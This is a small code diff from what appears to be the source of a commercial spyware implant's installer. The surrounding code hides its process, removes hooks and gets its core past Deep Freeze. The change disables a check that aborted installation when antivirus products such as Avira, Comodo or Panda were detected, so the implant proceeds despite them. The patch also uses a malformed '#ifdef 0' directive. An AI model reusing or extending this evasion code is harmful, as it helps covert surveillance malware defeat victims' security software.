@@ -1750,11 +1750,12 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 			dev_unhook.unhook_all(FALSE);
 		dev_unhook.unhook_func("ZwSetValueKey", TRUE);
 		dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
+#ifdef 0
 		if ((IsAvira() || IsBlink() || /*IsKaspersky() ||*/ IsKerio() || IsPGuard() || IsComodo2() || IsComodo3() || IsPanda() || /*IsTrend() ||*/ IsEndPoint()) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
 			ReportCannotInstall();
 			return;
 		}
-
+#endif
 		// Se c'e' deep freeze copia il core e il driver sul disco "reale"
 		if (IsDeepFreeze()) {
 			if (DFFixCore(&dev_unhook, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, FALSE)) {
